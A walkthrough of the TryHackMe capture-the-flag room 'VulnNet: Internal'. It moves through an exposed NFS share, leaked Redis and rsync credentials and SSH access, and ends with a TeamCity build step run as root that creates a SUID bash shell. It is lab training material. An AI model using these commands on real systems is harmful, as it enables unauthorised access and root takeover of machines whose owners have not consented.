# VulnNet: Internal

VulnNet Entertainment learns from its mistakes, and now they have something new for you...

VulnNet Entertainment is a company that learns from its mistakes. They quickly realized that they can't make a properly secured web application so they gave up on that idea. Instead, they decided to set up internal services for business purposes. As usual, you're tasked to perform a penetration test of their network and report your findings.

    Difficulty: Easy/Medium
    Operating System: Linux

This machine was designed to be quite the opposite of the previous machines in this series and it focuses on internal services. It's supposed to show you how you can retrieve interesting information and use it to gain system access. Report your findings by submitting the correct flags.

Note: It might take 3-5 minutes for all the services to boot.

Room: https://tryhackme.com/room/greprtp

## ⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution: https://github.com/garthheff/CTF-Hints/blob/main/vulnnetinternal.md

## Overview

This room chained together several exposed internal services:

* NFS exposed configuration files
* Redis credentials were leaked through the NFS share
* Redis contained a flag and encoded rsync credentials
* Rsync exposed a user home directory
* TeamCity logs leaked a super user token
* TeamCity executed build steps as root

## Enumeration

I started with a full TCP scan.

```bash
nmap -p- -sV 10.65.183.228
```

Interesting ports:

```text
22/tcp    open     ssh
111/tcp   open     rpcbind
139/tcp   open     netbios-ssn
445/tcp   open     netbios-ssn
873/tcp   open     rsync
2049/tcp  open     nfs
6379/tcp  open     redis
43101/tcp open     java-rmi
```

Port `9090` was shown as filtered and labelled `zeus-admin`, but this appeared to be an Nmap service-name guess rather than the useful path.

## NFS Enumeration

I checked for NFS exports.

```bash
showmount -e 10.65.183.228
```

Output:

```text
Export list for 10.65.183.228:
/opt/conf *
```

The `/opt/conf` export was available to all clients, so I mounted it.

```bash
mkdir -p /mnt/conf
mount -t nfs 10.65.183.228:/opt/conf /mnt/conf -o nolock
```

I listed the files.

```bash
find /mnt/conf -maxdepth 3 -type f -ls 2>/dev/null
```

The share contained several configuration files, including Redis configuration.

```text
/mnt/conf/redis/redis.conf
```

I searched the Redis config for useful settings.

```bash
grep -nE "^(bind|protected-mode|port|requirepass|dir|dbfilename|supervised)" /mnt/conf/redis/redis.conf
```

The config leaked the Redis password.

```text
requirepass "B65H...@F"
```

## Redis Access

Using the leaked password, I authenticated to Redis.

```bash
redis-cli -h 10.65.183.228 -a 'B65H...@F' ping
```

Output:

```text
PONG
```

I listed the Redis keys.

```bash
redis-cli -h 10.65.183.228 -a 'B65H...@F' --scan
```

Keys found:

```text
authlist
tmp
marketlist
int
internal flag
```

The `internal flag` key was a string.

```bash
redis-cli -h 10.65.183.228 -a 'B65H...@F' TYPE "internal flag"
redis-cli -h 10.65.183.228 -a 'B65H...@F' GET "internal flag"
```

Internal flag:

```text
THM{ff8e...8221}
```

## Redis Credential Discovery

The `authlist` key was a list.

```bash
redis-cli -h 10.65.183.228 -a 'B65H...@F' LRANGE "authlist" 0 -1
```

It contained base64 encoded data. After decoding it, I found rsync credentials.

```text
Authorization for rsync://rsync-connect@127.0.0.1 with password Hcg3...72v
```

Credentials found:

```text
Username: rsync-connect
Password: Hcg3...72v
```

The `marketlist` key contained normal list data.

```bash
redis-cli -h 10.65.183.228 -a 'B65H...@F' LRANGE "marketlist" 0 -1
```

Output included:

```text
Machine Learning
Penetration Testing
Programming
Data Analysis
Analytics
Marketing
Media Streaming
```

## Rsync Enumeration

I listed the rsync modules.

```bash
rsync 10.65.183.228::
```

Output:

```text
files    Necessary home interaction
```

I created a password file for rsync.

```bash
echo 'Hcg3...72v' > /tmp/rsync.pass
chmod 600 /tmp/rsync.pass
```

Then I downloaded the `files` module.

```bash
rsync -av --password-file=/tmp/rsync.pass rsync://rsync-connect@10.65.183.228/files ./rsync-dump/
```

The dump contained a home directory for `sys-internal`.

```bash
cd rsync-dump/sys-internal
ls
```

Output:

```text
Desktop
Documents
Downloads
Music
Pictures
Public
Templates
Videos
user.txt
```

I read the user flag.

```bash
cat user.txt
```

User flag:

```text
THM{da7c...07ab}
```

## SSH Access

The rsync exposure allowed access to the `sys-internal` user’s home directory. Using the exposed SSH material, I logged in as `sys-internal`.

```bash
ssh -i key sys-internal@10.65.183.228
```

Confirmed access:

```bash
whoami
```

Output:

```text
sys-internal
```

## Local Enumeration

I checked sudo access.

```bash
sudo -l
```

The account did not have the sudo password.

I checked SUID binaries.

```bash
find / -perm -4000 -type f -ls 2>/dev/null
```

There were two sudo binaries:

```text
/usr/local/bin/sudo
/usr/bin/sudo
```

This was suspicious, but it was not the final privilege escalation path.

Next, I checked running processes.

```bash
ps auxww
```

TeamCity was running as root from `/TeamCity`, including both the TeamCity server and the build agent.

## TeamCity Agent Configuration

I checked the TeamCity build agent configuration.

```bash
cat /TeamCity/buildAgent/conf/buildAgent.properties
```

Important values:

```text
serverUrl=http://localhost:8111/
authorizationToken=b441...4079
```

The authorization token appeared to be the agent token, not a web admin token.

## TeamCity Super User Token

I searched the TeamCity logs for super user tokens.

```bash
grep -Rni "Super user" /TeamCity/logs
```

The logs contained multiple super user authentication tokens.

Example masked token:

```text
4579...3701
```

The log message said to use an empty username with the token as the password.

## TeamCity Web Login

TeamCity was running locally on port `8111`.

If needed, I could access it through SSH port forwarding.

```bash
ssh -i key -L 8111:127.0.0.1:8111 sys-internal@10.65.183.228
```

Then browse to:

```text
http://127.0.0.1:8111
```

Login details:

```text
Username: blank
Password: 4579...3701
```

## Creating a SUID Root Shell

After logging in as the TeamCity super user, I created a manual build configuration.

Steps:

1. Create a project manually
2. Create a build configuration manually
3. Skip VCS setup
4. Add a build step
5. Runner type: Command Line
6. Custom script

```bash
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4755 /tmp/rootbash
ls -la /tmp/rootbash
```
7. Run

Then from the `sys-internal` SSH shell:

```bash
/tmp/rootbash -p
```

The `-p` option is important because it preserves the effective UID.

Confirmed root shell:

```bash
whoami
```

Output:

```text
root
```

## Services Flag

The services flag was located under `/opt/shares/temp`.

```bash
cat /opt/shares/temp/services.txt
```

Services flag:

```text
THM{0a09...440a}
```

## Attack Chain Summary

1. NFS exposed `/opt/conf`
2. Redis configuration was readable through NFS
3. Redis password was recovered from `redis.conf`
4. Redis contained the internal flag
5. Redis also contained base64 encoded rsync credentials
6. Rsync exposed the `sys-internal` home directory
7. User flag was recovered from `user.txt`
8. SSH access was gained as `sys-internal`
9. TeamCity was found running locally as root
10. TeamCity logs leaked super user authentication tokens
11. Super user access allowed creating a build step
12. The TeamCity build agent executed commands as root
13. Root flag was read and a SUID bash shell was created

```bash
rm -f /tmp/rootbash /tmp/tc-root.txt
```
